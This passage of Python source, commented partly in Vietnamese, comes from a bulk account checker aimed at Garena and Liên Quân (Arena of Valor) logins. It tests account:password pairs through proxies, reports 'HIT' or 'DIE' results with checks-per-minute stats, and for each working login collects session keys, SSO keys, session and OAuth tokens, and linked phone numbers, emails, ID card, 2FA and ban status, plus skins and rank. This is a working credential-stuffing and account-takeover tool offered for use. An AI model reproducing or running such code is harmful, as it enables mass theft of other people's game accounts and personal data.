        if debug:
            dbg.update({
                "login_has_enc": bool(enc_reply),
                "login_enc_len": len(enc_reply) if isinstance(enc_reply, (bytes, bytearray)) else 0,
            })
        if not enc_reply:
            out = {"account": account, "password": password,
                   "status": "ERROR", "detail": "Empty LoginReply data"}
            if debug:
                out["debug"] = dbg
            return out

        reply_decoded = _proto_decode(xtea_decrypt(enc_reply, xtea_key))
        uid           = reply_decoded.get(1, 0)
        session_key   = reply_decoded.get(2, b'')
        if debug:
            dbg.update({
                "uid": uid,
                "session_key_len": len(session_key) if isinstance(session_key, (bytes, bytearray)) else 0,
            })

        if not uid:
            out = {"account": account, "password": password,
                   "status": "ERROR", "detail": "UID=0 in reply"}
            if debug:
                out["debug"] = dbg
            return out

        result = {
            "account": account, "password": password, "status": "HIT",
            "uid": uid,
            "session_key": session_key.hex() if isinstance(session_key, bytes) else "",
        }
        if debug:
            result["debug"] = dbg

        # ── Post-login: fetch extra info ──
        if fetch_info and isinstance(session_key, bytes) and len(session_key) == 16:
            login_info = _fetch_login_info(sock, session_key)
            import datetime as _dt
            _login_reg = (login_info.get("region") or "").strip()
            if not _country_token_usable(_login_reg):
                _login_reg = ""
            result.update({
                "login_region": _login_reg,
                "region": _login_reg,
                "shells":  login_info.get('shells', 0),
                "topup_time": login_info.get('topup_time', 0),
            })
            # Last login timestamp
            ll = login_info.get('last_login', 0)
            if ll:
                result['last_login'] = _dt.datetime.fromtimestamp(ll).strftime('%Y-%m-%d %H:%M:%S')
            ct = login_info.get('created_time', 0)
            if ct:
                result['garena_created'] = _dt.datetime.fromtimestamp(ct).strftime('%H:%M:%S %d-%m-%Y')

            basic = _fetch_user_basic(sock, uid, session_key)
            result.update({
                "username": basic.get('username', ''),
                "nickname": basic.get('nickname', ''),
            })

            acct = _fetch_account_info(sock, session_key)
            result.update({
                "password_set":    acct.get('password_set', False),
                "cmd342_email_verified": acct.get('email_verified', False),
                "mobile_bound":    acct.get('mobile_bound', False),
                "account_secured": acct.get('account_secured', False),
            })
            result["email_verified"] = bool(acct.get("email_verified"))

            # CMD 467: Facebook
            fb_sock = _fetch_fb_info(
                sock, session_key, max_rounds=2 if _fetch_lean else 3
            )
            result["fb_linked"] = bool(fb_sock.get("fb_linked"))
            if fb_sock.get("fb_uid"):
                result["fb_uid"] = fb_sock["fb_uid"]

            sso = _fetch_sso_key(sock, session_key)
            sso_key = sso.get('sso_key', '')
            result['sso_key'] = sso_key

            tok = _fetch_session_token(sock, session_key)
            session_token = (tok.get("session_token") or "").strip()
            if session_token:
                result["session_token"] = session_token

            # ── Liên Quân (AOV) skin check ──
            aov_token = ""
            oauth = _fetch_oauth_token(sock, session_key, LIEN_QUAN_APP_ID)
            aov_token = oauth.get('access_token', '')
            if aov_token:
                result["aov_token"] = aov_token
                _ensure_uac_country(result, sso_key, proxy)
                reg_aov = _partition_region_for_aov(result)
                skins, weekly, aov_info = {}, {}, {}
                # Shop LQ + account/init song song — HTTP trực tiếp (không proxy combo).
                if HAS_REQUESTS:
                    # Lean mode: chỉ fetch những thứ thực sự cần
                    lean = _fetch_lean or _QUIET_BULK
                    if lean:
                        # Lean: weekly + UAC country + campus card là đủ
                        _nw = 3 if sso_key else 2
                        with ThreadPoolExecutor(max_workers=_nw) as _aov_pool:
                            _f_week = _aov_pool.submit(
                                _fetch_weekly_profile, aov_token, proxy, reg_aov
                            )
                            _f_skin = _aov_pool.submit(
                                _fetch_sale_skins, aov_token, proxy, reg_aov
                            )
                            _f_campus = (
                                _aov_pool.submit(
                                    _fetch_campuscard_data,
                                    sso_key,
                                    proxy,
                                )
                                if sso_key
                                else None
                            )
                            weekly = (_f_week.result() or {})
                            skins = (_f_skin.result() or {})
                            if _f_campus is not None:
                                campus = _f_campus.result() or {}
                                if campus:
                                    result["_campuscard"] = campus
                        # UAC country — cached, nhanh
                        if sso_key and not (result.get("uac_country") or "").strip():
                            uac = _fetch_uac_country_cached(sso_key, proxy)
                            if uac:
                                result["uac_country"] = uac.strip().upper()
                        # Account security — lean: chỉ khi chưa có
                        if sso_key and not result.get("_acct_sec_ok"):
                            acct_sec = _fetch_account_security(
                                sso_key, proxy=proxy, session_token=session_token
                            )
                            _apply_acct_sec_to_result(result, acct_sec)
                            if _security_snapshot_nonempty(acct_sec):
                                result["_acct_sec_ok"] = True
                        # Bỏ fetch_login_history trong lean (nặng nhất)
                    else:
                        # Full mode: tất cả APIs
                        _nw = 6 if sso_key else 3
                        with ThreadPoolExecutor(max_workers=_nw) as _aov_pool:
                            _f_skin = _aov_pool.submit(
                                _fetch_sale_skins, aov_token, proxy, reg_aov
                            )
                            _f_week = _aov_pool.submit(
                                _fetch_weekly_profile, aov_token, proxy, reg_aov
                            )
                            _f_info = _aov_pool.submit(
                                _fetch_aov_user_info, aov_token, reg_aov, proxy
                            )
                            _f_sec = (
                                _aov_pool.submit(
                                    _fetch_account_security,
                                    sso_key,
                                    proxy,
                                    session_token,
                                )
                                if sso_key
                                else None
                            )
                            _f_uac = (
                                _aov_pool.submit(_fetch_uac_country, sso_key, proxy)
                                if sso_key
                                and not (result.get("uac_country") or "").strip()
                                else None
                            )
                            _f_lq_last = (
                                _aov_pool.submit(
                                    _fetch_lq_last_login,
                                    sso_key,
                                    session_token,
                                    proxy,
                                )
                                if sso_key
                                else None
                            )
                            _f_campus = (
                                _aov_pool.submit(
                                    _fetch_campuscard_data,
                                    sso_key,
                                    proxy,
                                )
                                if sso_key
                                else None
                            )
                            skins = (_f_skin.result() or {})
                            weekly = (_f_week.result() or {})
                            aov_info = (_f_info.result() or {})
                            if _f_sec is not None:
                                acct_sec = _f_sec.result() or {}
                                _apply_acct_sec_to_result(result, acct_sec)
                                if _security_snapshot_nonempty(acct_sec):
                                    result["_acct_sec_ok"] = True
                            if _f_uac is not None:
                                uac_pre = str(_f_uac.result() or "").strip()
                                if uac_pre:
                                    result["uac_country"] = uac_pre.upper()
                            if _f_lq_last is not None:
                                lq_last = _f_lq_last.result()
                                if lq_last:
                                    result["last_login"] = lq_last
                            if _f_campus is not None:
                                campus = _f_campus.result() or {}
                                if campus:
                                    result["_campuscard"] = campus
                else:
                    if sso_key:
                        acct_sec = _fetch_account_security(
                            sso_key, proxy=proxy, session_token=session_token
                        )
                        _apply_acct_sec_to_result(result, acct_sec)
                        if _security_snapshot_nonempty(acct_sec):
                            result["_acct_sec_ok"] = True
                        lean2 = _fetch_lean or _QUIET_BULK
                        if not lean2:
                            lq_last = _fetch_lq_last_login(sso_key, session_token, proxy)
                            if lq_last:
                                result["last_login"] = lq_last
                        campus = _fetch_campuscard_data_cached(sso_key, proxy) or {}
                        if campus:
                            result["_campuscard"] = campus
                    skins = _fetch_sale_skins(aov_token, proxy=proxy, region=reg_aov) or {}
                    weekly = _fetch_weekly_profile(aov_token, proxy=proxy, region=reg_aov) or {}
                    aov_info = _fetch_aov_user_info(aov_token, region=reg_aov, proxy=proxy) or {}

                result["fb_linked"] = bool(result.get("fb_linked")) or bool(
                    fb_sock.get("fb_linked")
                )

                if skins:
                    result["aov_skins"] = skins
                    sn = (skins.get("sale_name") or "").strip()
                    if sn and not (result.get("aov_name") or "").strip():
                        result["aov_name"] = sn

                if weekly:
                    _apply_weekly_to_result(result, weekly)

                result["aov_user_info"] = aov_info if isinstance(aov_info, dict) else {}
                if isinstance(aov_info, dict):
                    pm0 = _extract_phone_from_nested(aov_info)
                    if pm0:
                        _apply_phone_to_result(result, pm0)

                # Level/ban — Kiến Tường (OAuth LQ thêm 1 lần); lean bỏ qua nếu weekly đã đủ
                _skip_kt = False
                if _fetch_lean or _QUIET_BULK:
                    try:
                        _wl0 = int((weekly or {}).get("account_level") or 0)
                    except (TypeError, ValueError):
                        _wl0 = 0
                    _skip_kt = bool(
                        (result.get("aov_rank") or "").strip()
                        and _wl0 > 0
                        and not _is_yes(result.get("aov_banned", "NO"))
                    )
                if not _skip_kt:
                    kt = _fetch_kientuong_player(sock, session_key, proxy=proxy)
                    if kt:
                        _merge_kientuong_snapshot(result, kt)

                # Cấp: Kiến Tường đôi khi chỉ có trong field lồng nhau; weekly/connect bổ sung
                try:
                    wl = int((weekly or {}).get("account_level") or 0)
                except (TypeError, ValueError):
                    wl = 0
                clv = _aov_level_from_connect_payload(aov_info) if isinstance(aov_info, dict) else 0
                raw_p = result.get("_kt_player") or {}
                lv_scan = _aov_level_from_nested_obj(raw_p)
                cur_lv = int(result.get("aov_level") or 0)
                result["aov_level"] = max(cur_lv, wl, clv, lv_scan)

                cqh = _aov_qh_from_connect_payload(aov_info) if isinstance(aov_info, dict) else 0
                if cqh > 0:
                    skm = result.get("aov_skins")
                    if not isinstance(skm, dict):
                        skm = {}
                    skm = dict(skm)
                    cur_qh = int(skm.get("cp", 0) or 0)
                    if cqh > cur_qh:
                        skm["cp"] = cqh
                        result["aov_skins"] = skm

                # Shop đã có skin/champ nhưng weekly/KT lần 1 thiếu (race, partition) → gọi lại tuần tự
                sk0 = result.get("aov_skins") or {}
                ts = int(sk0.get("total_skins") or 0)
                tc = int(sk0.get("total_champs") or 0)
                has_rank = bool((result.get("aov_rank") or "").strip())
                cur_lv0 = int(result.get("aov_level") or 0)
                try:
                    cur_cp0 = int(sk0.get("cp") or 0)
                except (TypeError, ValueError):
                    cur_cp0 = 0
                need_aov_topup = (
                    not _QUIET_BULK
                    and not _fetch_lean
                    and HAS_REQUESTS
                    and bool(aov_token)
                    and (ts >= 12 or tc >= 8)
                    and ((not has_rank) or cur_lv0 <= 0 or cur_cp0 <= 0)
                )
                if need_aov_topup:
                    time.sleep(0.15)
                    wm2 = _fetch_weekly_profile(aov_token, proxy, reg_aov) or {}
                    if wm2:
                        if not weekly:
                            _apply_weekly_to_result(result, wm2)
                        else:
                            _enrich_result_from_weekly_gaps(result, wm2)
                    ai2 = _fetch_aov_user_info(aov_token, reg_aov, proxy) or {}
                    if isinstance(ai2, dict) and ai2:
                        try:
                            pm2 = ((ai2.get("data") or {}).get("prefill_mobile") or "").strip()
                        except Exception:
                            pm2 = ""
                        if pm2 and not (result.get("aov_prefill_mobile") or "").strip():
                            result["aov_prefill_mobile"] = pm2
                        clv2 = _aov_level_from_connect_payload(ai2)
                        if clv2 > int(result.get("aov_level") or 0):
                            result["aov_level"] = clv2
                        cqh2 = _aov_qh_from_connect_payload(ai2)
                        if cqh2 > 0:
                            skm2 = dict(result.get("aov_skins") or {})
                            if cqh2 > int(skm2.get("cp", 0) or 0):
                                skm2["cp"] = cqh2
                                result["aov_skins"] = skm2
                    if (not (result.get("aov_rank") or "").strip()) or int(result.get("aov_level") or 0) <= 0:
                        kt2 = _fetch_kientuong_player(sock, session_key, proxy=proxy)
                        if kt2:
                            _merge_kientuong_snapshot(result, kt2)
                    try:
                        wl0 = int((weekly or {}).get("account_level") or 0)
                    except (TypeError, ValueError):
                        wl0 = 0
                    try:
                        wl2 = int((wm2 or {}).get("account_level") or 0)
                    except (TypeError, ValueError):
                        wl2 = 0
                    clv3 = _aov_level_from_connect_payload(ai2) if isinstance(ai2, dict) else 0
                    raw_p2 = result.get("_kt_player") or {}
                    lv_scan2 = _aov_level_from_nested_obj(raw_p2)
                    result["aov_level"] = max(
                        int(result.get("aov_level") or 0),
                        wl0,
                        wl2,
                        clv3,
                        lv_scan2,
                    )

                # Shop trả 0 skin/champ/QH nhưng weekly/KT đã có tín hiệu đang chơi → gọi lại shop
                # tuần tự (tránh race/throttle khi ThreadPool chạy sale + weekly + connect cùng lúc).
                sk0 = result.get("aov_skins") or {}
                ts = int(sk0.get("total_skins") or 0)
                tc = int(sk0.get("total_champs") or 0)
                try:
                    cur_cp0 = int(sk0.get("cp") or 0)
                except (TypeError, ValueError):
                    cur_cp0 = 0
                has_rank = bool((result.get("aov_rank") or "").strip())
                cur_lv0 = int(result.get("aov_level") or 0)
                aov_nm = (result.get("aov_name") or "").strip()
                shop_barren = ts <= 0 and tc <= 0 and cur_cp0 <= 0
                played_signal = has_rank or cur_lv0 >= 3 or bool(aov_nm)
                if (
                    HAS_REQUESTS
                    and shop_barren
                    and played_signal
                    and not _QUIET_BULK
                    and not _fetch_lean
                ):
                    for _d in (0.1, 0.25):
                        time.sleep(_d)
                        sk_try = _fetch_sale_skins(aov_token, proxy, reg_aov) or {}
                        if not sk_try:
                            continue
                        t2 = int(sk_try.get("total_skins") or 0)
                        c2 = int(sk_try.get("total_champs") or 0)
                        try:
                            p2 = int(sk_try.get("cp") or 0)
                        except (TypeError, ValueError):
                            p2 = 0
                        if t2 > ts or c2 > tc or p2 > cur_cp0:
                            result["aov_skins"] = sk_try
                            sn2 = (sk_try.get("sale_name") or "").strip()
                            if sn2 and not (result.get("aov_name") or "").strip():
                                result["aov_name"] = sn2
                            ts, tc, cur_cp0 = t2, c2, p2
                        if ts > 0 or tc > 0 or cur_cp0 > 0:
                            break

                if (
                    aov_token
                    and _is_aov_hit_incomplete(result)
                    and not (_fetch_lean and _result_has_security_data(result))
                ):
                    _refill_aov_gaps(
                        result, sock, session_key, aov_token, reg_aov, proxy
                    )
            elif sso_key:
                acct_sec = _fetch_account_security(
                    sso_key, proxy=proxy, session_token=session_token
                )
                _apply_acct_sec_to_result(result, acct_sec)
                result["fb_linked"] = bool(result.get("fb_linked")) or bool(
                    fb_sock.get("fb_linked")
                )
                if not (result.get("uac_country") or "").strip():
                    uac_pre = _fetch_uac_country_cached(sso_key, proxy)
                    if uac_pre:
                        result["uac_country"] = uac_pre.strip().upper()
                if not (_fetch_lean or _QUIET_BULK):
                    lq_last = _fetch_lq_last_login(sso_key, session_token, proxy)
                    if lq_last:
                        result["last_login"] = lq_last
                campus = _fetch_campuscard_data_cached(sso_key, proxy) or {}
                if campus:
                    result["_campuscard"] = campus

            if not (
                (_fetch_lean or _QUIET_BULK)
                and result.get("_acct_sec_ok")
                and _result_has_security_data(result)
            ):
                _refill_security_bindings(
                    result, sock, session_key, aov_token, proxy
                )

            _resolve_account_country(result, sso_key, proxy)

        campus = result.get("_campuscard", {})
        if campus.get("name"):
            result["aov_name"] = campus["name"]
            result["nickname"] = campus["name"]
        if campus.get("rank"):
            result["aov_rank"] = campus["rank"]
        if campus.get("stars") is not None:
            result["aov_rank_stars"] = campus["stars"]

        if result.get("aov_rank"):
            # Lọc số sao cũ dính liền nếu có để dịch cho chuẩn
            base_r = re.sub(r'\s*\d+$', '', result["aov_rank"]).strip()
            trans_r = _translate_aov_rank(base_r)
            # Thêm lại số sao nếu có
            stars = result.get("aov_rank_stars", 0)
            if trans_r in ("Cao Thủ", "Chiến Tướng") and stars > 0:
                result["aov_rank"] = f"{trans_r} {stars}"
            else:
                result["aov_rank"] = trans_r

        return result

    except socket.timeout:
        timed_out_ip = _HOST_IP
        with _HOST_IP_lock:
            _HOST_IP = None
        out = {
            "account": account,
            "password": password,
            "status": "TIMEOUT",
            "detail": f"Socket timeout to {HOST}:{PORT} (ip={timed_out_ip or 'unknown'})",
        }
        if debug:
            out["debug"] = dbg
        return out
    except Exception as exc:
        out = {"account": account, "password": password, "status": "ERROR", "detail": str(exc)}
        if debug:
            out["debug"] = dbg
        return out
    finally:
        if sock:
            try: sock.close()
            except: pass
        _conn_sem.release()  # tra lai slot cho thread khac

# ── Pretty printer ────────────────────────────────────────────────────────────
def _print_hit_box(r: dict):
    """Print a highlighted HIT box in the CMD with all key info."""
    sk = r.get('aov_skins') or {}
    sep = _c(C.CYAN, '─' * 62)
    top = _c(C.BG_GREEN + C.BOLD + C.WHITE, '  ✔  HIT FOUND  ✔  '.center(62))
    print(f"\n{top}")
    print(sep)

    def row(label: str, value: str, color: str = C.WHITE):
        lbl = _c(C.YELLOW, f"  ► {label:<18}")
        val = _c(color, value)
        print(f"{lbl}{val}")

    acc = r.get('account', '')
    pw  = r.get('password', '')
    row("Account",  f"{acc}:{pw}", C.CYAN + C.BOLD)
    row("UID",      str(r.get('uid', '')))
    if r.get('nickname'):
        row("Nickname",  r['nickname'], C.MAGENTA)
    if r.get('aov_name'):
        row("LQ Name",   r['aov_name'], C.MAGENTA)

    ctry = _country_label_hit(r)
    reg  = (r.get('region')  or '').strip()
    if ctry and ctry != "UNKNOWN":
        row("Country",  ctry, C.GREEN)
    elif ctry == "UNKNOWN":
        row("Country",  "UNKNOWN", C.YELLOW)
    if reg:
        row("Region",   reg)

    _sec = _hit_security_sources(r)
    # Get best available phone
    _full_phone = (r.get('aov_prefill_mobile') or '').strip()
    _show_phone = _full_phone or (r.get('masked_phone') or '').strip() or _hit_pick_first_phone(_sec)
    
    if _show_phone:
        mob_str = _c(C.GREEN, f"YES [{_show_phone}]")
    else:
        mob_str = _c(C.GREEN, 'YES') if r.get('mobile_bound') else _c(C.RED, 'NO')
        
    best_email = _hit_best_email(r)
    has_email = _has_any_email(r)
    email_verified = _is_email_verified(r)
    verify_txt = "ĐÃ XÁC THỰC" if email_verified else "CHƯA XÁC THỰC"
    if best_email:
        base = f"YES [{best_email}] ({verify_txt})"
        mail_str = _c(C.GREEN if email_verified else C.YELLOW, base)
    elif has_email:
        mail_str = _c(C.GREEN if email_verified else C.YELLOW, f"YES ({verify_txt})")
    else:
        mail_str = _c(C.RED, "NO")

    fb_str   = _c(C.GREEN, 'YES') if _hit_fb_linked_from_sources(r) else _c(C.RED, 'NO')
    _ic = (r.get('idcard') or '').strip() or _hit_pick_first_idcard(_sec)
    cccd_str = _c(C.GREEN, 'YES') if _ic.replace('*','') else _c(C.RED, 'NO')
    auth_str = _c(C.GREEN, 'YES') if _hit_has_authenticator(r) else _c(C.RED, 'NO')
    ban_raw  = r.get('aov_banned', 'NO')
    is_banned = _is_yes(ban_raw)
    ban_str  = _c(C.RED, 'BAN') if is_banned else _c(C.GREEN, 'NO')
    print(f"  {_c(C.YELLOW, '► Security          ')}SĐT:{mob_str}  Mail:{mail_str}  FB:{fb_str}  CCCD:{cccd_str}  2FA:{auth_str}  BAN:{ban_str}")
    if is_banned and r.get('aov_unban_time'):
        row("Mở Ban", str(r.get('aov_unban_time')), C.YELLOW)

    shells = r.get('shells', 0)
    if shells:
        row("Sò",       str(shells), C.YELLOW)

    aov_rank = r.get('aov_rank', '')
    aov_lv   = _hit_display_aov_level(r)
    if aov_rank:
        rank_disp = _format_rank(aov_rank)
        # Ưu tiên số sao fetch được từ API, fallback sang parse chuỗi
        stars = int(r.get('aov_rank_stars') or 0) or _extract_master_stars(aov_rank)
        if stars:
            rank_disp += f" [{stars} ⭐]"
        row("Rank",     rank_disp, C.MAGENTA)
    if aov_lv:
        row("Level",    str(aov_lv))

    total_sk   = sk.get('total_skins', 0)
    total_chmp = sk.get('total_champs', 0)
    cp         = sk.get('cp', 0)
    row("Skin/Champ", f"{total_sk} skins / {total_chmp} champs  QH={cp}",
        C.GREEN if total_sk else C.GRAY)

    for tier, label in (('sss','SSS'), ('ss','SS'), ('anime','Anime')):
        cnt = sk.get(tier, 0)
        if cnt:
            names = ', '.join(sk.get(f'{tier}_list', [])[:5])
            row(f"{label}({cnt})",  names, C.CYAN)

    garena_created = r.get('garena_created', '')
    if garena_created:
        row("Tạo GR",   garena_created)
    ll = r.get('last_login', '')
    if ll:
        row("Đăng nhập", _fmt_last_login(ll), C.YELLOW)

    tinh_trang = _derive_tinh_trang(r)
    tt_color   = C.GREEN if tinh_trang == 'Acc Trắng' else (C.RED if 'Full' in tinh_trang else C.YELLOW)
    row("Tình Trạng", tinh_trang, tt_color)

    print(sep + "\n")


def _print_result(r: dict, verbose: bool = False, stats: dict = None):
    status = r["status"]
    acc    = r['account']
    pw     = r['password']

    # Build live stats suffix
    stat_str = ""
    if stats is not None:
        done  = stats.get('done', 0)
        total = stats.get('total', 0)
        hits  = stats.get('hits', 0)
        inv   = stats.get('invalid', 0)
        err   = stats.get('error', 0)
        pct   = f"{done*100//total}%" if total else "0%"
        stat_str = _c(C.GRAY, f" [{done}/{total} {pct}  ") + \
                   _c(C.GREEN, f"HIT:{hits}") + _c(C.GRAY, " ") + \
                   _c(C.RED, f"DIE:{inv}") + _c(C.GRAY, " ") + \
                   _c(C.YELLOW, f"ERR:{err}") + _c(C.GRAY, "]")

    if status == "HIT":
        _print_hit_box(r)
        if verbose and r.get('session_key'):
            print(_c(C.GRAY, f"  SessKey: {r['session_key']}"))
    elif status == "INVALID":
        print(_c(C.RED, f"\n ✘ [DIE]") + _c(C.GRAY, f" {acc}:{pw}") + stat_str)
    elif status == "TIMEOUT":
        print(_c(C.YELLOW, f"\n ⏱ [TIMEOUT]") + _c(C.GRAY, f" {acc}") + stat_str)
    elif status == "MISS":
        # Lọc bỏ MISS result=101/105/174/367 (tài khoản không phải Garena) — không in
        detail = r.get('detail', '')
        skip_codes = ('result=101', 'result=105', 'result=174', 'result=367')
        if any(c in detail for c in skip_codes):
            return  # im lặng, không in
        print(_c(C.GRAY, f"\n ! [MISS]") + _c(C.GRAY, f" {acc} {detail}") + stat_str)
    else:
        detail = r.get('detail', '')
        print(_c(C.YELLOW, f"\n ! [{status}]") + _c(C.GRAY, f" {acc} {detail}") + stat_str)

def _print_bulk_status(stats: dict, started_at: float):
    """Single-line bulk progress to avoid log spam."""
    done  = stats.get('done', 0)
    total = stats.get('total', 0)
    hits  = stats.get('hits', 0)
    inv   = stats.get('invalid', 0)
    nf    = stats.get('not_found', 0)
    err   = stats.get('error', 0)
    sk    = stats.get('miss_skip', 0)
    cap   = stats.get('captcha', 0)
    oth   = stats.get('other', 0)
    white_hits = stats.get('white_hits', 0)
    white_shells = stats.get('white_shells', 0)
    incomplete = stats.get('incomplete', 0)
    pct   = f"{done*100//total}%" if total else "0%"
    elapsed = max(1.0, time.time() - started_at)
    cpm = int(done / elapsed * 60)
    line = (
        f"[{done}/{total}] {pct} | CPM:{cpm} | HIT:{hits} | DIE:{inv} | NF:{nf} | ERR:{err} | "
        f"SKIP:{sk} | CAP:{cap}"
    )
    if incomplete:
        line += f" | LAI:{incomplete}"
    if oth:
        line += f" | ?:{oth}"
    line += f" | WHITE:{white_hits} | SO_WHITE:{white_shells}"
    sys.stdout.write(f"\r\033[K{line}")
    sys.stdout.flush()

# ── Helpers ────────────────────────────────────────────────────────────────────
def _fmt_last_login(ts_str: str) -> str:
    """Format last login as raw date format like 'YYYY-MM-DD HH:MM:SS'."""
    if not ts_str:
        return 'N/A'
    import datetime as _dt
    try:
        dt = _dt.datetime.strptime(ts_str, '%Y-%m-%d %H:%M:%S')
        if dt.year < 2010:
            return 'Chưa từng đăng nhập'
        return ts_str
    except Exception:
        return ts_str


def format_oplog_time(time_val):
    if not time_val:
        return "N/A"
    if isinstance(time_val, (int, float)):
        try:
            if time_val > 10000000000:
                time_val = time_val / 1000
            import datetime
            tz_offset = datetime.timezone(datetime.timedelta(hours=7))
            dt = datetime.datetime.fromtimestamp(time_val, tz=tz_offset)
            return dt.strftime('%Y-%m-%d %H:%M:%S')
        except Exception:
            val_str = str(time_val).strip()
            return val_str.replace(" GMT+7", "").replace(" GMT", "")
    val_str = str(time_val).strip()
    if val_str.isdigit():
        return format_oplog_time(int(val_str))
    return val_str.replace(" GMT+7", "").replace(" GMT", "")


def fetch_login_history(sso_key: str, session_token: str = "", proxy=None) -> list:
    if not HAS_REQUESTS or not sso_key:
        return []
    ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"
    sess = _requests.Session()
    
    proxy_dict = _get_http_proxies(proxy)
    if proxy_dict:
        sess.proxies = proxy_dict

    # Set initial cookies
    for domain in (".garena.com", "account.garena.com", "sso.garena.com"):
        sess.cookies.set("sso_key", sso_key, domain=domain)
    if session_token:
        sess.cookies.set("session_token", session_token, domain="account.garena.com")
        
    # Prime security cookies
    try:
        resp = sess.get(
            "https://sso.garena.com/api/universal/login",
            headers={"User-Agent": ua},
            params={
                "app_id": "10100",
                "sso_key": sso_key,
                "redirect_uri": "https://account.garena.com/",
            },
            verify=False,
            timeout=15,
            allow_redirects=False,
            proxies=proxy_dict
        )
        if resp.status_code in (301, 302, 303, 307, 308, 200):
            _sso_follow_redirect(sess, resp, ua, proxy)
    except Exception:
        pass

    try:
        sess.get(
            "https://sso.garena.com/api/universal/login",
            headers={"User-Agent": ua},
            params={
                "app_id": "10100",
                "sso_key": sso_key,
                "redirect_uri": "https://account.garena.com/",
            },
            verify=False,
            timeout=15,
            allow_redirects=True,
            proxies=proxy_dict
        )
    except Exception:
        pass

    headers = {
        "User-Agent": ua,
        "Accept": "application/json, text/plain, */*",
        "Referer": "https://account.garena.com/vi",
        "X-Requested-With": "XMLHttpRequest",
    }
    
    all_logs = []
    url = "https://account.garena.com/api/account/init"
    api_success = False
    try:
        resp = sess.get(url, headers=headers, timeout=15, verify=False, proxies=proxy_dict)
        if resp.status_code == 200:
            data = resp.json()
            if isinstance(data, dict) and not data.get("error"):
                api_success = True
                log_list = data.get("login_history")
                if isinstance(log_list, list):
                    all_logs.extend(log_list)
    except Exception:
        pass

    if not api_success:
        return []

    import unicodedata
    def has_lq(logs):
        for item in logs:
            if not isinstance(item, dict):
                continue
            source = item.get("opsrc") or item.get("source") or item.get("device") or item.get("platform") or item.get("client") or ""
            source_str = str(source).strip()
            s = source_str.lower().strip()
            s = unicodedata.normalize('NFKD', s).encode('ascii', 'ignore').decode('ascii')
            if "lien quan" in s or "lienquan" in s or "lq" == s:
                return True
        return False

    max_pages = 5
    page_count = 1
    
    while all_logs and not has_lq(all_logs) and page_count < max_pages:
        last_item = all_logs[-1]
        if not isinstance(last_item, dict):
            break
        last_ts = last_item.get("timestamp") or last_item.get("time") or last_item.get("created_time")
        if not last_ts:
            break
        try:
            last_ts = int(last_ts)
        except (TypeError, ValueError):
            break
            
        url_logs = "https://account.garena.com/api/account/login_logs/get"
        headers_logs = {
            "User-Agent": ua,
            "Accept": "application/json, text/plain, */*",
            "Referer": "https://account.garena.com/login-history",
            "X-Requested-With": "XMLHttpRequest",
            "Content-Type": "application/json"
        }
        
        try:
            resp = sess.post(url_logs, headers=headers_logs, json={"last_login_ts": last_ts}, timeout=15, verify=False, proxies=proxy_dict)
            if resp.status_code == 200:
                data = resp.json()
                if isinstance(data, dict) and not data.get("error"):
                    log_list = data.get("login_history")
                    if isinstance(log_list, list) and log_list:
                        all_logs.extend(log_list)
                        page_count += 1
                        continue
            break
        except Exception:
            break

    return all_logs


def _fetch_lq_last_login(sso_key: str, session_token: str, proxy) -> str:
    """Gọi history login từ Garena, tìm login 'Liên Quân Mobile' gần nhất để lấy thời gian."""
    if not sso_key:
        return ""
    try:
        logs = fetch_login_history(sso_key, session_token, proxy)
        if not logs:
            return ""
        
        import unicodedata
        def normalize_str(s):
            s = str(s).lower().strip()
            s = unicodedata.normalize('NFKD', s).encode('ascii', 'ignore').decode('ascii')
            return s

        for item in logs:
            if not isinstance(item, dict):
                continue
            
            source = item.get("opsrc") or item.get("source") or item.get("device") or item.get("platform") or item.get("client") or ""
            source_str = str(source).strip()
            norm_source = normalize_str(source_str)
            
            if "lien quan" in norm_source or "lienquan" in norm_source or "lq" == norm_source:
                time_val = item.get("time") or item.get("created_time") or item.get("date") or item.get("timestamp") or item.get("optime")
                return format_oplog_time(time_val)
    except Exception:
        pass
    return ""


def _fetch_campuscard_data(sso_key: str, proxy=None) -> dict:
    """Gọi campuscard API từ sso_key để lấy rank và tên game chuẩn."""
    if not HAS_REQUESTS or not sso_key:
        return {}
    
    proxies = _get_http_proxies(proxy)
    ts = int(time.time() * 1000)
    try:
        resp = _requests.post(
            "https://auth.garena.com/oauth/token/grant",
            headers={
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
                "Content-Type": "application/x-www-form-urlencoded",
            },
            data=f"client_id=100054&response_type=code&redirect_uri=https%3A%2F%2Fcampuscard.moba.garena.vn%2F&format=json&id={ts}000",
            cookies={"sso_key": sso_key},
            proxies=proxies,
            verify=False,
            timeout=15,
        )
        if resp.status_code != 200:
            return {}
        data = resp.json()
        redirect = data.get("redirect_uri", "")
        m = re.search(r'[?&]code=([^&]+)', redirect)
        if not m:
            return {}
        oauth_code = m.group(1)
        
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",
            "code": oauth_code,
            "Referer": "https://campuscard.moba.garena.vn/",
            "partition": "1011",
        }
        resp2 = _requests.get(
            "https://campuscard.moba.garena.vn/v1/api/profile",
            headers=headers,
            verify=False,
            timeout=15,
            proxies=proxies,
        )
        if resp2.status_code != 200:
            return {}
        data2 = resp2.json()
        if "error" in data2:
            return {}
            
        result = {}
        if "username" in data2:
            result["name"] = data2["username"]
        ranking = data2.get("ranking", {})
        if ranking:
            result["rank"] = ranking.get("name", "")
            result["stars"] = int(ranking.get("star", 0))
            result["rank_level"] = int(ranking.get("level", 0))
        return result
    except Exception:
        return {}

# ── Campus Card Cache ───────────────────────────────────────────────────────
_campus_cache: dict = {}  # sso_key -> (data, timestamp)
_campus_cache_lock = __import__('threading').Lock()
_CAMPUS_CACHE_TTL = 600.0  # 10 minutes

def _fetch_campuscard_data_cached(sso_key: str, proxy=None) -> dict:
    """Cached version of _fetch_campuscard_data."""
    if not sso_key:
        return {}
    now = time.time()
    with _campus_cache_lock:
        cached = _campus_cache.get(sso_key)
        if cached and (now - cached[1]) < _CAMPUS_CACHE_TTL:
            return cached[0]
    result = _fetch_campuscard_data(sso_key, proxy)
    with _campus_cache_lock:
        _campus_cache[sso_key] = (result, now)
    return result


# ── Cached wrapper for campuscard data ─────────────────────────────────────
_CAMPUSCARD_CACHE: dict = {}

def _fetch_campuscard_data_cached(sso_key: str, proxy=None) -> dict:
    """Cached version of _fetch_campuscard_data — giảm HTTP calls trong lean mode."""
    if not sso_key:
